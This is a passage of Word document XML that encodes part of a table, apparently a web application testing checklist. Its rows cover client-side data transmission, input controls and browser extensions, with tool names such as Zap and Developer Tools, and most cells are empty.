          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7FEB06B4" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="766D16E2" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="6E2CDB03" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="107" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1452" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="5AD59DAC" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>3.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="500EC439" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Transmission of data via client</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="618A9865" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1D0544CB" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="41E0EB31" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="49DAF5EE" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="70197E67" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Hidden Fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1D13388C" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00180AE3" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Zap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="056D018B" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="561C7CC2" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6CAB8B64" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0C0F7E4E" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Cookies</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="496D3D4B" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00911F9A" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Developer Tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="7ED5409B" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="0A5842D9" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1DEB0176" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="5BA3BD52" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Preset Parameters</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="33A2C822" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="06E495EC" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="438A881E" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="107" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1452" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="77093693" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>3.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="377FAB00" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Client-side input Controls</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="37CFF3BF" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="3FC6AA92" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="06200146" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="3494C203" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="49E3C222" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Length limits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="419B7269" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0380FABE" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="79A83D0A" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="14DDA164" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="15852D55" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>JavaScript validation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="3128CB9B" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0517B5DB" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="0B5AAAF9" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="463AA876" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="535D8C36" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Disabled elements</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="46D8C92F" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00180AE3" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Zap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="05AAFA8D" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="5222A263" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="107" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1452" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="305DCB54" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>3.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="194E2A30" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Browser Extensions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="66B530A7" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="50185FDE" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="3AC4649B" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="15BC8888" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="7CCE97B4" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Java applets</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1C9ECD7A" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="133D892E" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="7FC15A2D" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1B545F4F" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0ED91ABE" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>ActiveX controls</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="39E3919D" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6A55FC6A" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="28FD7F22" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="37AD713A" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="13DD81BC" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRPr="005A1C80" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Flash objects</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="33C6BD99" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1199" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6A64682D" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00CD4824">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F33EAA" w14:paraId="402B31CD" w14:textId="77777777" w:rsidTr="00F33EAA">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="213" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
